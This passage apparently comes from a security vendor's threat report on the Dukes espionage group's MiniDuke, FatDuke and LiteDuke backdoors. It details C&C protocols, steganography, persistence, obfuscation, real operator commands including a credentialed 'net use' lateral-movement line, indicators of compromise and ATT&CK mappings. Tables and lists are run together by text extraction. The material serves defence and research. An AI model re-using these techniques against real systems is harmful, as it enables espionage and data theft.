pixel are extracted to recover the hidden data22The steganographically altered image has almost no visible difference from the original image because the two or three least significant bits have a very limited impact on the color. For the green and blue components of each pixel a maximum of 7/256, and for the red component 3/256 of a fully saturated pixel variation will occur. Figure 24 shows a blue of value 255 (on the left) and the maximum deviation from that in just the blue spectrum with a value of 248 (on the right). There is apparently no difference but, by doing that on every pixel of the image, allows the attacker to store a backdoor in a still valid PNG image.255248Figure 24 // Comparison between a blue of value 255 and a blue of value 248Finally, it decrypts the extracted bytes using the AES key hardcoded in the config. The decrypted data can be:• a Windows executable • a Windows DLL • a PowerShell scriptWe have seen the following executables being dropped by this Dropbox backdoor:• Several MiniDuke backdoors (see section 4 4) • Process Explorer, a utility that is part of the SysInternals suite4.4 MiniDuke backdoor: the second stage As highlighted in section 3 2, the most recent versions of the MiniDuke backdoor have a lot of code similarities with earlier versions, such as the sample with SHA-1 of 86EC70C27E5346700714DBAE2F10E168A08210E4, described by Kaspersky researchers in 2014 [21]. Our analysis is based on the sample with SHA-1 B05CABA461000C6EBD8B237F318577E9BCCD6047, compiled on August 17, 2018. MiniDuke acts as a second-stage backdoor, which is dropped by one of the two first-stage components described in the sections above.The most recent samples we are aware of were compiled in June 2019 and show no major changes, except the C&C domain and the use of an invalid (likely transplanted) digital signature, as shown in Figure 25. This might be an attempt to bypass some security products.Figure 25 // Invalid digital signature added to the backdoor23The backdoor is still written in pure x86 assembly but its size increased a lot – from 20 KB to 200+ KB. This is due to the addition of obfuscation, mainly control-flow flattening [26], as shown in Figure 26. This is a common obfuscation technique that makes it difficult to read the code because every function is split in a switch/case inside a loop.Figure 26 // Control flow flattening used to obfuscate the MiniDuke backdoorSome of the Windows API functions are resolved dynamically. The backdoor uses a simple hash function to obfuscate the name of the function it tries to resolve.The network communication is relatively simple. It can use the GET, POST and PUT HTTP methods to contact the hardcoded C&C server.In order to blend into the legitimate traffic, the data are prepended with a JPEG header. The resulting images are not valid, but it is very unlikely that anybody will check the validity of all pictures in the network traffic. Figure 27 is an example of a POST request to the C&C server. As the server was down at the time of capture, we were not able to receive a reply, but we believe the reply also contains a JPEG header, as the malware ignores the first bytes of the reply.Figure 27 // Post request to the C&C server that looks like a regular jpeg file uploadIn addition to the HTTP protocol, the malware is able to send and receive data over a named pipe. This feature typically allows it to reach machines on the local network that don’t have internet access. One compromised machine, with internet access, will forward commands to other compromised machines through the named pipe.A similar feature to the named pipe is the HTTP proxy. The malware will listen on a first socket, either on the default port 8080 or on a port specified by the operators. It will also open a second socket with the C&C server. It waits for connections on the first socket and when one is established, it proxies data between the two sockets. Thus, a machine without internet access, or with a firewall that blocks connec- tions to the attackers’ domain, might still be able to reach the C&C through the proxy machine.24Finally, this malware implements thirty-eight different backdoor functions such as:• Uploading or downloading files • Creating processes • Getting system information (hostname, ID, pipename, HTTP method) • Getting the list of local drives and their type (unk, nrt, rmv, fix, net, cdr, ram, und) • Reading and writing in the named pipe • Starting and stopping the proxy feature4.5 FatDuke: the third stage FatDuke is the current flagship backdoor of the group and is only deployed on the most interesting machines. It is generally dropped by the MiniDuke backdoor, but we also have seen the operators dropping FatDuke using lateral movement tools such as PsExec.The operators regularly repack this malware in order to evade detections. The most recent sample of FatDuke we have seen was compiled on May 24, 2019.We have seen them trying to regain control of a machine multiple times in a few days, each time with a different sample. Their packer, described in a later section, adds a lot of code, leading to large binaries. While the effective code should not be larger than 1MB, we have seen one sample weighing in at 13MB, hence our name for this backdoor component: FatDuke.In this section, we will use the sample with SHA-1 DB19171B239EF6DE8E83B2926EADC652E74A5AFA for our analysis.Installation and persistence During our investigation, we were not able to find a dropper for FatDuke. We believe the operators simply install the backdoor and establish persistence using the standard commands of an earlier stage backdoor.We also noted that FatDuke generally replaced the second-stage binary, reusing the persistence mechanism already in place.The persistence we have seen is very standard. They use the registry key HKLM\SOFTWARE\Microsoft\ Windows\CurrentVersion\Run and creatd a new value named Canon Gear and value C:\Program Files\Canon\Network ScanGear\Canocpc.exe. This launches the backdoor each time a user logs in.Configuration FatDuke has a hardcoded configuration embedded in the executable’s resources, as shown in Figure 28.Figure 28 // FatDuke configuration data in the PE resources25The configuration data is a JSON object encoded in base64. Once decoded, it reveals much interesting information, as shown in Figure 29.{ "pivoting_ip":	"<redacted	local	IP	v4	address>", "server_address":	"url", "connection_types":	"WinInet,WinHttp,UrlMon", }"cookies":	"param,location,id_cookie,info,session_id", "activity_scheduler":	"Mon,Tue,Wed,Thu,Fri;0:00-23:59", "grab_ua_by_probing": "0""request_min_timeout_s":	"1", "request_max_timeout_s":	"60", "php_aliases":	"about.php,list.php,contacts.php,people.php,forum.php,index.php,Figure 29 // FatDuke configuration exampleIncluded in the information contained in the config, we can see:• The AES key used to encrypt/decrypt the network traffic • The pipe name and the credentials used to contact another machine on the local network • The C&C URL • The time of day when the backdoor is enabled for attacker access • Cookies that the malware can fetch in the browser’s cookie directory. They are related to cookies usedby Google services such as YouTube or GmailThe operator has the possibility to fetch the configuration from the computer along with usual computer information like username, Windows version, computer name, build, etc.Finally, it does not seem possible to update this configuration without dropping a new version of the malware.Backdoor and network FatDuke can be controlled remotely by the attackers using a custom C&C protocol over HTTP or using named pipes on the local network. HTTP communications and backdoor commandsIn order to blend into the network traffic, FatDuke tries to mimic the user’s traffic by using the same User-Agent as the browser installed on the system. It implements two different techniques to gather this value.26First, it can probe the User-Agent by making an HTTP request on a socket it has just created.1. It creates a socket listening on localhost:80 2. It accepts any connection 3. It calls ShellExecuteW with open and url as argument. This will open the defaultbrowser on the URL localhost.4. The socket replies with a hardcoded HTTP reply:HTTP/1.1 200 OK Server: Apache/2.2.14 (Win32) Content-Type: text/html Connection: close <html><script>window.close();</script></html> This simple JavaScript code will directly close the browser. The window pops up only for a fraction of second but the user also loses focus of the currently active window.5. In order to extract the User-Agent, FatDuke parses the HTTP request sent by the browser to its socket. If the previous method did not work, it can check the default browser in the registry key HKCU\Software\ Classes\http\shell\open\command. It then selects one of the hardcoded User-Agent strings accordingly, as shown in Table 5.Table 5Hardcoded User-AgentDefault BrowserChromeSelected User-Agent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0Firefox Internet Explorer Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)OperaSafariMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.35 Safari/537.36 OPR/24.0.1558.21 Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2Next, FatDuke contacts the C&C server, specified in the config, and uses one of the PHP scripts specified in the php_aliases field of the config. It is interesting to note that these filenames are related to the theme of the C&C server domain. For example, they registered the domain westmedicalgroup[.]net, and the aliases list contains filenames such as doctors.php or diagnostics.php. Figure 30 is a summary of the C&C protocol.FatDukeGET Request to the C&C</>HTML pageUse a regexto extract a speciﬁcimage URLImage URLDownloadsthe PNG image>_MaliciousactionExecutethe command{ JSON }Decodeand decryptBackdoorcommand in JSONImage URLFigure 30 // FatDuke C&C protocol27The requests sent to the C&C server are crafted to look like typical GET requests and once again are related to the script name. For example, the request below uses parameters that you might expect to find on a forum’s website./homepage/forum.php?newsid=<RANDOM>&article=<REDACTED>&user= However, while some fields are randomly generated strings, article and user could be used by the operator to pinpoint the victim. The first keyword, article, is an identifier – a SHA-256 hash of the volume identifier concatenated with MAC addresses found on the target computer. The other keyword, user, probably flags the general configuration that comes with the malware. This value is located in the PE resource section, right before the encoded configuration mentioned in section 4 5.The reply is an HTML page, with the HTML content copied from a legitimate website such as the BBC. However, if the C&C server wants to send a command to the malware, it will add an additional HTML img tag to the page, as shown in Figure 31.Figure 31 // Additional image tag sent by FatDuke C&COnce it receives this HTML page, the malware uses the two following regexes:• <img id=”id[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*> • <img id=”idd[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*> These regexes extract the src attribute value – the URI of the image. If it finds an image, the malware will make another GET request to http(s)://<C&C>/<directory>/<php_script.php>?imageid=<src value>. In our example, it will make a request to url This will return a file, such as that shown in Figure 32. These files masquerade as PNG images in the GET request, but are not valid images. They contain a header of 0x37 bytes, matching one hardcoded in the malware, and a chunk of encrypted data that is base64 encoded. To further the PNG subterfuge, the header contains an incomplete, misplaced and corrupted PNG header, which may be sufficient to avert concern under cursory examination.Figure 32 // C&C response including most of a valid PNG header and an encrypted command for FatDuke28The malware then decrypts this data using AES-256 in ECB mode, with the key hardcoded in the config. The result is a command in JSON. Figure 33 shows six real command examples.{"commandBody":"14 C:\\Users\\<redacted>\\AppData\\ Local","size":0,"iscmd":true} {"commandBody":"5 -parsing=raw -type=exe net. exe use \\\\WORKPC\\IPC$ \\"<redacted password>\\" / USER:Administrator","size":0,"iscmd":true} {"commandBody":"5 -parsing=raw -type=exe schtasks.exe /Query /FO TABLE","size":0,"iscmd":true} {"commandBody":"14	C:\\Users\\Administrator","size":0,"iscmd":true} {"commandBody":"14 \\\\<redacted>\\C$\\Users\\User\\ Desktop","size":0,"iscmd":true} {"commandBody":"7","size":0,"iscmd":true}Figure 33 // Example of commands sent to FatDukeThese JSON objects contain a command identifier and the command arguments. Table 6 shows the commands implemented by FatDuke.Table 6FatDuke backdoor commandsID Read or write an environment variable Load a DLL Unload a DLL Execute rundll32 Execute a command, a wscript, a PowerShell command or create a process Execute a command, a wscript, a PowerShell command or create a process, using a pipe to get the result Kill a process Kill itself Uninstall (secure delete its DLL and exit the process) Turn on or off the random interval Set User-Agent to default valueEnable debug logReturn the working directory Change the working directory Move a file or a directoryID Copy a file or a directory Remove a directory Remove a file Compute the MD5 of a filecat a fileExfiltrate a fileWrite a file Write random data to a file (secure deletion)System informationDate List running processes Return the list of disks with their type and available space Return malware information Listen to a pipe Stop listening to a pipe List open pipesThe C&C servers used for FatDuke do not seem to be compromised websites. In order to look legitimate, they register variants of existing domains and redirect the homepage of their C&C server to the homepage of the real domain. As mentioned before, this technique is also used for PolyglotDuke C&C servers.For example, they registered the domain fairfieldsch[.]org and make it redirect to fairfields.northants.sch.uk, the website of a school in the UK. We also noticed that they used several C&C servers per targeted organization, but these servers apparently don’t overlap across the victims, ensuring tight compartmentalization.29Local network pivotingWhat if the compromised machine doesn’t have access, or has restricted access, to the Internet? The developers implemented a functionality they called PivotingPipeTransport. It allows the malware to communicate with other malware instances using pipes. In order to connect to a remote machine, it first calls WNetAddConnection2. This function takes the following arguments:• lpNetResource: the remote machine • lpPassword: the remote password • lpUserName: the remote username These pieces of information are available in the malware configuration under the names:• pivoting_ip Then, it will create a pipe using the name specified in the pivoting_pipe configuration field and use it to communicate with the other malware instance.Thus, this functionality allows attackers to bypass network restrictions that may be enforced on critical systems. However, they need to steal the credentials of the remote machine first or use organization-level administrative credentials.Obfuscation The FatDuke binaries are highly obfuscated. They use three different techniques in order to slow down analysis.First, they use string stacking for all important strings; this consists of building strings dynamically by pushing each character separately on the stack, rather than using strings from the .data section. They also add some basic operations to the stacking in order to prevent the extraction without emulating the code. Figure 34 shows such an example where the ASCII value of each letter is multiplied with a hardcoded value of 1.Figure 34 // FatDuke obfuscation – String stackingSecond, they also add opaque predicates in most of the functions. Opaque predicates are conditions that are always True or always False. They are not part of the code's semantic, but the code is harder to read. Figure 35 is an example of opaque predicates we found in FatDuke. Whatever the result of rand() is, v11 is always equal to 15. Thus, the condition is always False.Figure 35 // FatDuke obfuscation – Opaque predicate30Third, they add junk code and junk strings. Unlike opaque predicates, the code will be executed but it is useless and again is not part of the semantics of the program. For example, the function in Figure 36 and in Figure 37 returns always the same value, which is never used.Figure 36 // FatDuke obfuscation – Junk function callFigure 37 // FatDuke obfuscation – Junk function return valueThe binary contains a huge amount of strings from different projects like Chromium. It might be an attempt to bypass security products, similar to what was posted by SkyLight [27]. These strings are used to fill very large structures (about 1000 fields), probably to hide the few interesting fields used by the malware, as shown in Figure 38.Figure 38 // FatDuke obfuscation – Chromium stringsWe are not sure whether Dukes’ developers used a commercial obfuscation tool or if they developed their own. However, given their level of sophistication, it would not be surprising if they rely on their own obfuscator.314.6 LiteDuke: the former third stage LiteDuke is a third-stage backdoor that was mainly used in 2014-2015. It is not directly linked to Operation Ghost, but we found it on some machines compromised by MiniDuke. We chose to document it mainly because we did not find it described elsewhere. We have dubbed it LiteDuke because it uses SQLite to store information such as its configuration. Our analysis is based on the sample with SHA-1 AF2B46D4371CE632E2669FEA1959EE8AF4EC39CE.Link with the Dukes LiteDuke uses the same dropper as PolyglotDuke. It also uses the same encryption scheme, shown in Figure 7 in section 3 2, to obfuscate its strings. As we haven’t seen any other threat actor using the same code, we are confident that LiteDuke was indeed part of the Dukes’ arsenal.Packer LiteDuke is packed using several layers of encryption and steganography.1. In the PE resources section, the initial dropper has a GIF picture. The picture is not valid but containsa second dropper.2. This second executable has a BMP picture in its resources. It uses steganography to hide bytesin the image. Once decoded and decrypted, we have the loader.3. The loader will decrypt the backdoor code and load it into memory.Figure 39 summarizes the unpacking process from the initial dropper to the backdoor code.exeDropper (cid:7)exeDropper (cid:141)exeLoaderExtract from the resourcessectionDecryptand executeExtract from the resourcessectionDecode, decrypt, drop and executeDecrypt and loadinto memoryGIFGIF picture(cid:20)invalid(cid:14)BMPBMP picture(cid:31)with data hiddenusing steganography(cid:14)BackdoorFigure 39 // LiteDuke unpacking processSide StoryWe also noticed that the attackers left a curious artefact in an older sample (the dropper with SHA-1 7994714FFDD6411A6D64A7A6371DB9C529E70C37) as shown in Figure 40.Figure 40 // Curious phone number left by the attackersThis is the phone number of a mental health specialist in a small city in the state of Indiana in the United States.32Backdoor The backdoor code only exists in memory as only the loader is written to disk. The loader persists using a Windows shortcut (.lnk file) that is registered in the traditional CurrentVersion\Run registry key. According to the PE header, the developers did not make use of Visual Studio to compile this backdoor. Figure 41 shows that they used the linker FASM 1.70. FASM (Flat Assembler) is an assembler that can produce Windows or Linux binaries. It reminds us of the MiniDuke backdoor, developed directly in x86 assembly.Figure 41 // Assembler used by the developer (screenshot of DIE analysis)The backdoor DLL exports seven functions that have relatively explicit names (CC being Crypto Container):• SendBin • DllEntryPointInterestingly, the malware apparently attempts to bypass Kaspersky security products by checking if the registry key HKCU\Software\KasperskyLab exists and if so, it waits 30 seconds before executing any additional code. We do not know whether this really bypasses any Kaspersky security products.The Crypto Container is an SQLite database, stored on the disk in the same directory as the loader, and uses SQLCipher. This SQLite extension encrypts the database using AES-256. The encryption key is the MD5 hash of machine-specific values (such as CPUID, the account name, the BIOS version and the processor name) to prevent decryption if, for example, the database ends up in a public malware repository. The key is not stored anywhere but is re-generated at each execution.The database contains three different tables, which are created using the following commands:CREATE	TABLE	modules	(uid	INTEGER	PRIMARY	KEY,	version	char(255), code	blob,	config	blob,	type	char(10),	md5sum	char(32),	autorun (INTEGER); CREATE	TABLE	objects	(uid	INTEGER	PRIMARY	KEY	AUTOINCREMENT,	name CHAR(255),	body	blob,	type	char(10),	md5sum	char(32)); CREATE	TABLE	config	(uid	INTEGER	PRIMARY	KEY	AUTOINCREMENT,	agent_id CHAR(128),	remote_host	CHAR(256),	remote_port	integer,	remote_path char(1024),	update_interval	integer,	server_key	CHAR(32),	rcv_header CHAR(64));The configuration default values are hardcoded in the binary. This SQLite table allows the malware operators to update these parameters easily.Similarly, the modules, which are plug-ins for the backdoor, are stored in the database. Since the database is encrypted, the modules never touch the disk in plaintext and will only be loaded into memory. Unfortunately, we have not yet been able to find any of the plug-ins used by LiteDuke.One artefact of the development method is the implementation of the backdoor commands. Usually, a backdoor will have a big switch statement to check the command sent by the C&C server against the list of commands implemented in the malware. In the case of LiteDuke, it is a succession of loops: one loop per implemented command, as shown in Figure 42.33Figure 42 // Multiple while loops instead of a backdoor switch caseEach of the 41 different commands has between three and six possible command IDs. The program will loop successively on the list until the ID in the list matches the ID provided by the operator. The full list is available in Figure 43.Figure 43 // List of LiteDuke command IDsGiven the large number of different commands, we won’t list them all. Basically, the backdoor can:• Upload or download files • Securely delete a file by first writing random data (from a linear congruential generator) to the file • Update the database (config, modules and objects) • Create a process • Get system information (CPUID, BIOS version, account name, etc.) • Terminate itselfThe network part of the backdoor is relatively simple. It uses GET requests to contact either the hardcoded C&C URL or the one stored in the database. Figure 44 shows the domain, resources and parameters used by LiteDuke.34Figure 44 // LiteDuke C&C domain, resources and parametersAmong the different samples we analyzed, the C&C domains are different, but they always use a script named rcv_get.php. We believe that the C&C domains are compromised servers. In order to blend into the network traffic, and similar to FatDuke, the malware checks the default browser and chooses its User-Agent request header accordingly, as shown in Table 7. It can also get the proxy configuration from Firefox, in the configuration file prej.js, or from Opera, in the operaprefs.ini file. This information is then used when establishing a connection to the C&C server.Table 7User-Agent strings used by LiteDukeDefault BrowserInternet ExplorerFirefoxChromeSafariOperaUser-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729) Mozilla/5.0 (Windows NT 6.2; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWeb- Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4 Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.7.62 Version/11.01As one can see, some of these User-Agents are custom and they all refer to very old browsers, most of them released in 2011. It is also way less stealthy than with FatDuke’s sniffing of the real User-Agent used by the local browser. This reinforces our hypothesis that this backdoor was used many years ago and is no longer deployed in the wild.5. CONCLUSION Operation Ghost shows that the Dukes never stopped their espionage activities. They were in the spotlight after the breach of the Democratic National Committee during the 2016 US presidential elections. However, they then recovered from that media attention and rebuilt most of their toolset.Using these new tools and previously used techniques, such as leveraging Twitter and steganography, they were able to breach Foreign Affairs Ministries of several European governments.This campaign also shows that APT threat actors going dark for several years does not mean they have stopped spying. They might pause for a while and re-appear in another form, but they still need to spy to fulfill their mandates.To help defenders better protect their networks, we will continue to monitor the Dukes’ developments.Indicators of Compromise can also be found on GitHub. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset com.356. BIBLIOGRAPHY 1 D. Alperovitch, “Bears in the Midst: Intrusion into the Democratic National Committee,” 15 06 2016. [Online].Available: url crowdstrike com/blog/bears-midst-intrusion-democratic-national-committee/.2 Department of Homeland Security, “Enhanced Analysis of GRIZZLY STEPPE Activity,” 10 02 2017. [Online]. Available: url us-cert gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_ STEPPE_Activity pdf.3 GReAT, “The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor,”27 02 2013. [Online]. Available: url com/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/31112/.4 A. Lehtiö, “THE DUKES: 7 years of Russian cyberespionage,” 17 09 2015. [Online].Available: url f-secure com/documents/996508/1030745/dukes_whitepaper pdf.5S. R. Skjeggestad, H. Stolt-Nielsen, L. Tomter, E. Omland and A. Strønen, “Norge utsatt for et omfattende hackerangrep,” 07 02 2017. [Online]. Available: url nrk no/norge/norge-utsatt-for-et-omfattende-hackerangrep-1 13358988.6 A. T. Matthew Dunwoody, B. Withnell, J. Leathery, M. Matonis and N. Carr, “Not So Cozy: An UncomfortableExamination of a Suspected APT29 Phishing Campaign,” 19 11 2018. [Online]. Available: url fireeye com/ blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign html.7 A. Cherepanov, “GREYENERGY: A successor to BlackEnergy,” 10 2018. [Online]. Available:url welivesecurity com/wp-content/uploads/2018/10/ESET_GreyEnergy pdf.8 A. Cherepanov, “The rise of TeleBots: Analyzing disruptive KillDisk attacks,” ESET, 13 12 2016. [Online].Available: url welivesecurity com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/.9 T. Brewster, “Sophisticated ‘MiniDuke’ hackers start hunting governments and drugdealers,” 03 07 2014. [Online]. Available: url theguardian com/technology/2014/jul/03/ miniduke-hackers-governments-drug-dealers-kaspersky.10 F-Secure, “COZYDUKE,” 22 04 2015. [Online]. Available:url f-secure com/documents/996508/1030745/CozyDuke.11 M. Dunwoody, “Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY),”03 04 2017. [Online]. Available: url fireeye com/blog/threat-research/2017/03/dissecting_one_ofap html.12 FireEye, “HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group,” 07 2015. [Online].Available: url fireeye com/rs/848-DID-242/images/rpt-apt29-hammertoss pdf.131415Symantec Security Response, “’Forkmeiamfamous’: Seaduke, latest weapon in the Duke armory,” 13 07 2015. [Online]. Available: url symantec com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory.S. Adair, “PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs,” 09 11 2016. [Online]. Available: url volexity com/blog/2016/11/09/ powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/.J. Pitts, “The Case of the Modified Binaries,” 23 10 2014. [Online]. Available: url leviathansecurity com/blog/the-case-of-the-modified-binaries/.16 A. Lehtiö, “OnionDuke: APT Attacks Via the Tor Network,” 14 11 2014. [Online]. Available:url f-secure com/weblog/archives/00002764 html.17 ESET Research, “Miniduke still duking it out,” 20 05 2014. [Online]. Available:url welivesecurity com/2014/05/20/miniduke-still-duking/.1819S. Lozhkin, “Minidionis – one more APT with a usage of cloud drives,” 15 07 2015. [Online]. Available: url com/minidionis-one-more-apt-with-a-usage-of-cloud-drives/71443/.J.-I. Boutin and M. Faou, “Visiting the snake nest,” 01 2018. [Online]. Available: url cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest pdf.3620 ESET Research, “En Route with Sednit,” 10 2016. [Online]. Available:url welivesecurity com/wp-content/uploads/2016/10/eset-sednit-full pdf.21 GReAT, “Miniduke is back: Nemesis Gemina and the Botgen Studio,” 03 07 2014. [Online]. Available:url com/miniduke-is-back-nemesis-gemina-and-the-botgen-studio/64107/.22 The Unicode Consortium, “Katakana Range: 30A0–30FF,” [Online]. Available:url unicode org/charts/PDF/U30A0 pdf.23 The Unicode Consortium, “Cherokee Range: 13A0-13FF,” [Online]. Available:url org/charts/PDF/U13A0 pdf.24 The Unicode Consortium, “Kangxi Radicals Range: 2F00-2FDF,” [Online]. Available:url org/charts/PDF/U2F00 pdf.25 P.-M. Bureau and C. Dietrich, “Hiding in Plain Sight,” 2015. [Online]. Available: url blackhat com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels pdf.26 T. László and Á. Kiss, “Obfuscating C++ programs via control flow flattening,” 08 2009. [Online].Available: url inf elte hu/Vol_030_2009/003 pdf.27Skylight, “Cylance, I Kill You!,” 18 07 2019. [Online]. Available: url com/2019/07/18/cylance-i-kill-you/.Compilation Date 07/07/2014 07/06/2017 07/06/2017 07/08/2017 19/10/2018 21/12/2017 10/07/2018 29/08/2018 01/10/2018 25/10/2018 01/12/2018 29/08/2018 17/08/2018 24/06/2019 03/05/2017 22/05/2019 19/04/2019 02/10/2014ESET detection name Win32/Agent.ZWH Win32/Agent.AAPY Win32/Agent.ZWH Win64/Agent.OL Win64/Agent.OL MSIL/Tiny.BG MSIL/Tiny.BG MSIL/Agent.TGC MSIL/Agent.SVP MSIL/Agent.SXO MSIL/Agent.SYC MSIL/Agent.CAW Win32/Agent.TSG Win32/Agent.TUF Win32/Agent.TSH Win32/Agent.TSH Win32/Agent.AAPY Win32/Agent.AART377.INDICATORS OF COMPROMISE7.1 HashesComponentSHA-14BA559C403FF3F5CC2571AE0961EAFF6CF0A50F6 AF2B46D4371CE632E2669FEA1959EE8AF4EC39CEPolyglotDukeRegDuke LoaderRegDuke BackdoorMiniDukeFatDukeFatDuke Loader LiteDuke7.2 NetworkDomainsComponentDomainacciaio.com[.]br mavin21c.dothome.co[.]kr rulourialuminiu.co[.]uk bandabonga[.]frPolyglotDukeMiniDukeFatDukeLiteDuke38Public webpages used by PolyglotDukeurl url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url#q=Heiofjskghwe+Hjwefkbqw url url url url MITRE ATT&CK TECHNIQUES MovementT1078Valid AccountsT1106Execution through APIT1129T1086 Registry Run Keys / Startup Folder Scheduled TaskValid AccountsWindows Management Files or Information File DeletionModify RegistryObfuscated Files or InformationRundll32 ScriptingT1045Software PackingT1078Valid AccountsT1102Web ServiceT1083T1135 T1057T1049File and Directory Discovery Network Share Discovery The Dukes likely used spearphishing emails to compromise the target. Operators use account credentials previously stolen to come back on the victim’s network. They use CreateProcess or LoadLibrary Windows APIs to execute binaries.Some of their malware load DLL using LoadLibrary Windows API.FatDuke can execute PowerShell scripts. The FatDuke loader uses rundll32 to execute the main DLL. FatDuke can execute PowerShell scripts. The Dukes use PsExec to execute binaries on remote hosts. The Dukes use the CurrentVersion\Run registry key to establish persistence on compromised computers. The Dukes use Scheduled Task to launch malware at startup. The Dukes use account credentials previously stolen to come back on the victim’s network.The Dukes used WMI to establish persistence for RegDuke.The droppers for PolyglotDuke and LiteDuke embed encrypted payloads. The Dukes malware can delete files and directories. The keys used to decrypt RegDuke payloads are stored in the Windows registry. The Dukes encrypts PolyglotDuke and LiteDuke payloads with custom algorithms. They also rely on known obfuscation techniques such as opaque predicates and control flow flattening to obfuscate RegDuke, MiniDuke and FatDuke. The FatDuke loader uses rundll32 to execute the main DLL. FatDuke can execute PowerShell scripts. The Dukes use a custom packer to obfuscate MiniDuke and FatDuke binaries. They also use the commercial packer .NET Reactor to obfuscate RegDuke. The Dukes use account credentials previously stolen to come back on the victim’s network. PolyglotDuke fetches public webpages (Twitter, Reddit, Imgur, etc.) to get encrypted strings leading to new C&C. server. For RegDuke, they also use Dropbox as a C&C server. The Dukes can interact with files and directories on the victim’s computer. The Dukes can list network shares. The Dukes can list running processes. The Dukes can execute commands like net use to gather information on network connections.T1077Windows Admin SharesThe Dukes use PsExec to execute binaries on a remote host.40CollectionCommand and ControlT1005T1039T1025Data from Local System Data from Network Shared Drive Data from Removable MediaT1090Connection ProxyT1001Data ObfuscationT1008Fallback ChannelsT1071Standard Application Layer ProtocolT1102Web ServiceExfiltrationT1041Exfiltration Over Command and Control ChannelThe Dukes can collect files on the compromised machinesThe Dukes can collect files on shared drives.The Dukes can collect files on removable drives.The Dukes can communicate to the C&C server via proxy. They also use named pipes as proxies when a machine is isolated within a network and does not have direct access to the internet. The Dukes use steganography to hide payloads and commands inside valid images. The Dukes have multiple C&C servers in case one of them is down. The Dukes are using HTTP and HTTPS protocols to communicate with the C&C server. PolyglotDuke fetches public webpages (Twitter, Reddit, Imgur, etc.) to get encrypted strings leading to new C&C server. For RegDuke, they also use Dropbox as a C&C server.The Dukes use the C&C channel to exfiltrate stolen data. 